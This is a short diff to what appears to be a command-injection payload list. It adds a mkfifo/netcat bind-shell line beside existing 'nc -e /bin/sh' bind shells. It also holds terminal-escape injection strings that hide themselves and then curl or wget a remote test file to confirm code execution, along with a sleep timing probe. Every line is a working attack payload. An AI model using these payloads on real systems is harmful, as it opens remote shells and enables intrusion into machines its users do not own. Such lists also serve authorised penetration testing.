@@ -314,6 +314,7 @@ nc -lvvp 4445 -e /bin/sh &
 nc -lvvp 4446 -e /bin/sh|
 nc -lvvp 4447 -e /bin/sh;
 nc -lvvp 4448 -e /bin/sh&
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lp 4242 > /tmp/f
 \necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
 \necho INJECTX\nexit\n\033[2Asleep 5\n
 \necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
